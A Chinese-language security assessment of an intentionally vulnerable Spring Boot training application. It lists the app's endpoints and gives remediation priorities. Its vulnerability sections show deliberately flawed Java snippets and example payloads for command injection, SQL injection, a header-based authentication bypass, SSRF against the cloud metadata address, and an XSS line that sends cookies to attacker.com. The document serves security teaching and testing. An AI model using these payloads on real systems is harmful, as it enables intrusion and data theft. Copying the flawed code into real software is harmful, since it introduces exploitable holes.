# Shannon Target 应用安全分析报告

## 1. 应用程序结构与技术栈概览

### 1.1 项目基本信息

| 属性 | 值 |
|------|-----|
| 项目名称 | shannon-target |
| 版本 | 1.0.0 |
| 描述 | Vulnerable target application for security testing |
| 包名 | com.example.shannontarget |

### 1.2 技术栈

| 层级 | 技术 | 版本 |
|------|------|------|
| **后端框架** | Spring Boot | 3.2.0 |
| **编程语言** | Java | 17 |
| **模板引擎** | Thymeleaf | (由Spring Boot管理) |
| **构建工具** | Maven | 3.9 |
| **数据库** | H2 (In-Memory) | 由Spring Boot管理 |
| **前端** | 原生HTML/CSS/JavaScript | - |
| **容器化** | Docker | - |

### 1.3 项目架构

```
shannon-target/
├── src/main/java/com/example/shannontarget/
│   ├── ShannonTargetApplication.java       # 主启动类
│   └── controller/
│       ├── XssController.java               # XSS漏洞演示
│       ├── CmdController.java               # 命令注入漏洞演示
│       ├── AuthController.java              # 认证绕过漏洞演示
│       └── ApiController.java               # SSRF/SQL注入漏洞演示
├── src/main/resources/
│   ├── application.properties               # 应用配置
│   └── static/index.html                    # 前端管理界面
├── pom.xml                                  # Maven依赖配置
└── Dockerfile                               # 容器化配置
```

---

## 2. 框架、语言与架构模式分析

### 2.1 框架分析

**Spring Boot 3.2.0** 是该应用的核心框架，具有以下特点：
- 自动配置（Auto-configuration）
- 嵌入式Web服务器（默认Tomcat）
- RESTful控制器支持（`@RestController`）
- 依赖注入容器

### 2.2 架构模式

该应用采用经典的**MVC + REST API**混合架构：

| 组件 | 实现 |
|------|------|
| **Controller层** | Spring `@RestController` 处理HTTP请求 |
| **数据存储** | H2内存数据库 + 内存集合 |
| **前端** | 静态HTML + AJAX调用后端API |

### 2.3 架构图

```
┌─────────────────────────────────────────────────────────────┐
│                    Client (Browser)                         │
│                   index.html + JavaScript                   │
└─────────────────────────┬───────────────────────────────────┘
                          │ HTTP/HTTPS
┌─────────────────────────▼───────────────────────────────────┐
│                   Spring Boot Application                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              REST Controllers                        │   │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌────────┐  │   │
│  │  │XssController│CmdController│AuthController│ApiController│  │   │
│  │  └────┬─────┘ └────┬─────┘ └────┬─────┘ └───┬────┘  │   │
│  │       │            │            │          │        │   │
│  │       ▼            ▼            ▼          ▼        │   │
│  │  ┌─────────────────────────────────────────────┐    │   │
│  │  │    Business Logic (Vulnerable)              │    │   │
│  │  └─────────────────────────────────────────────┘    │   │
│  └──────────────────────┬──────────────────────────────┘   │
│                         │                                    │
│         ┌───────────────┴───────────────┐                  │
│         ▼                               ▼                  │
│  ┌─────────────┐              ┌──────────────┐              │
│  │ H2 Database │              │Memory Store  │              │
│  │(In-Memory)  │              │(Comments)    │              │
│  └─────────────┘              └──────────────┘              │
└─────────────────────────────────────────────────────────────┘
```

---

## 3. 应用类型判定

### 3.1 架构类型：**Web应用 + REST API混合架构**

| 特征 | 判定依据 |
|------|----------|
| **Web前端** | 静态HTML页面(index.html)提供管理界面 |
| **后端API** | 4个REST控制器提供JSON API |
| **服务端口** | 8080 (HTTP) |
| **数据库** | H2内存数据库 |

### 3.2 端点汇总

| 端点 | 功能 | 漏洞类型 |
|------|------|----------|
| `GET/POST /comment` | 评论管理 | XSS |
| `GET /search` | 搜索功能 | XSS |
| `POST /profile` | 个人资料 | XSS |
| `GET /ping` | 网络诊断 | 命令注入 |
| `GET /traceroute` | 路由追踪 | 命令注入 |
| `GET /nslookup` | DNS查询 | 命令注入 |
| `POST /login` | 用户登录 | 认证绕过 |
| `GET /dashboard` | 仪表盘 | 访问控制 |
| `GET /fetch` | URL抓取 | SSRF |
| `GET /user/search` | 用户搜索 | SQL注入 |
| `GET /user/lookup` | 用户查询 | SQL注入 |

---

## 4. 安全影响分析

### 4.1 严重安全漏洞（Critical）

#### 4.1.1 命令注入漏洞 (Command Injection)

**位置：** `CmdController.java`

```java
@GetMapping("/ping")
public ResponseEntity<Map<String, Object>> ping(@RequestParam String host) {
    String command = "ping -n 2 " + host;  // 直接拼接用户输入
    ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
    // ...
}
```

**影响：**
- 攻击者可在服务器上执行任意操作系统命令
- 可能导致服务器完全沦陷
- 可访问敏感文件、横向移动、安装后门

**风险等级：** ⭐⭐⭐⭐⭐ (Critical)

**Payload示例：**
```
/ping?host=127.0.0.1; whoami
/ping?host=127.0.0.1 & dir
```

#### 4.1.2 SQL注入漏洞 (SQL Injection)

**位置：** `ApiController.java`

```java
@GetMapping("/user/search")
public ResponseEntity<Map<String, Object>> searchUser(@RequestParam String username) {
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    ResultSet rs = queryStmt.executeQuery(sql);
    // ...
}
```

**影响：**
- 攻击者可提取任意数据库数据
- 可能获取管理员凭据
- 在H2数据库中可执行Java代码（RCE）

**风险等级：** ⭐⭐⭐⭐⭐ (Critical)

**Payload示例：**
```
/user/search?username=' UNION SELECT 1,2,3,4--
/user/lookup?id=1; CREATE TABLE cmd(s VARCHAR(100));--
```

#### 4.1.3 认证绕过漏洞 (Authentication Bypass)

**位置：** `AuthController.java`

```java
@PostMapping("/login")
public ResponseEntity<Map<String, Object>> login(...) {
    String adminHeader = request.getHeader("X-Admin-Header");
    if (adminHeader != null) {
        return ResponseEntity.ok(Map.of(
            "success", true,
            "user", "admin",
            "role", "administrator"
        ));
    }
    // ...
}
```

**影响：**
- 攻击者可绕过登录验证
- 获取管理员权限
- 访问敏感管理功能

**风险等级：** ⭐⭐⭐⭐⭐ (Critical)

**Payload示例：**
```http
POST /login?username=xxx&password=xxx
X-Admin-Header: anyvalue
```

---

### 4.2 高危安全漏洞 (High)

#### 4.2.1 跨站脚本攻击 (XSS)

**位置：** `XssController.java`

```java
@PostMapping("/comment")
public ResponseEntity<Map<String, Object>> addComment(@RequestParam String content) {
    comments.add(Map.of("content", content, ...));  // 无任何过滤
    // ...
}
```

**影响：**
- 窃取用户Cookie/Session
- 钓鱼攻击
- 键盘记录
- 蠕虫传播

**风险等级：** ⭐⭐⭐⭐ (High)

**Payload示例：**
```
/comment?content=<script>fetch('http://attacker.com?c='+document.cookie)</script>
```

#### 4.2.2 服务器端请求伪造 (SSRF)

**位置：** `ApiController.java`

```java
@GetMapping("/fetch")
public ResponseEntity<Map<String, Object>> fetch(@RequestParam String url) {
    String response = restTemplate.getForObject(url, String.class);
    // ...
}
```

**影响：**
- 访问云元数据服务（AWS/GCP/Azure）
- 扫描内部网络
- 绕过防火墙

**风险等级：** ⭐⭐⭐⭐ (High)

**Payload示例：**
```
/fetch?url=http://169.254.169.254/latest/meta-data/  (AWS元数据)
/fetch?url=http://localhost:8080/admin
```

---

### 4.3 中危安全漏洞 (Medium)

#### 4.3.1 缺少速率限制

**位置：** `AuthController.java` - 登录端点

**影响：**
- 暴力破解密码
- 资源耗尽

**风险等级：** ⭐⭐⭐ (Medium)

#### 4.3.2 敏感信息泄露

**位置：** 多个端点的响应

**影响：**
- 泄露服务器路径信息
- 泄露SQL查询语句

**风险等级：** ⭐⭐⭐ (Medium)

---

### 4.4 安全配置问题

| 问题 | 位置 | 风险 |
|------|------|------|
| H2数据库默认无密码 | application.properties | 中危 |
| 无HTTPS配置 | application.properties | 高危 |
| 无安全请求头 | 全局 | 中危 |
| 无CSRF保护 | Spring Security未配置 | 高危 |
| 无会话管理 | 内存会话 | 中危 |

---

## 5. 安全影响总结

### 5.1 整体安全评级

| 维度 | 评级 |
|------|------|
| **机密性** | 🔴 极危 - SQL注入、认证绕过可导致数据泄露 |
| **完整性** | 🔴 极危 - 命令注入可修改服务器任意内容 |
| **可用性** | 🟠 高危 - 命令注入可使服务不可用 |
| **整体评级** | 🔴 **CRITICAL** |

### 5.2 攻击面分析

```
暴露的攻击面：
├── 11个Web端点
│   ├── 3个命令注入 (OS Command Injection)
│   ├── 2个SQL注入 (SQL Injection)  
│   ├── 3个XSS (Cross-Site Scripting)
│   ├── 1个SSRF (Server-Side Request Forgery)
│   └── 2个认证问题 (Auth Bypass + Brute Force)
├── H2数据库 (无认证)
└── 无安全防护机制
```

### 5.3 建议修复优先级

| 优先级 | 漏洞 | 修复方案 |
|--------|------|----------|
| P0 | 命令注入 | 使用`ProcessBuilder.command(List)`避免shell解释 |
| P0 | SQL注入 | 使用PreparedStatement参数化查询 |
| P0 | 认证绕过 | 移除后门验证逻辑 |
| P1 | XSS | 输出编码 + 输入验证 |
| P1 | SSRF | URL白名单验证 |
| P2 | 速率限制 | 添加登录限流 |
| P2 | 安全头 | 添加CSP/X-Frame-Options等 |

---

## 6. 技术栈摘要表

| 类别 | 技术 | 用途 | 安全影响 |
|------|------|------|----------|
| **后端框架** | Spring Boot 3.2.0 | Web框架 | ⚠️ 需正确配置安全 |
| **语言** | Java 17 | 编程语言 | ✅ 类型安全 |
| **数据库** | H2 (In-Memory) | 数据存储 | ⚠️ 生产环境需独立部署 |
| **前端** | HTML5 + JS | 用户界面 | ⚠️ 需防XSS |
| **构建** | Maven | 依赖管理 | ✅ 安全的构建流程 |
| **容器** | Docker | 部署 | ✅ 隔离环境 |
| **运行** | Eclipse Temurin JRE 17 | Java运行时 | ✅ LTS版本 |

---

## 结论

该应用是一个**故意包含多种安全漏洞的靶场应用**，用于安全测试培训。应用存在以下关键安全问题：

1. **无任何输入验证** - 所有用户输入直接用于业务逻辑
2. **缺少安全最佳实践** - 未使用参数化查询、输出编码等
3. **存在认证后门** - 故意设置的认证绕过机制
4. **安全配置缺失** - 无HTTPS、无安全头、无速率限制

**在生产环境中严禁部署此应用。**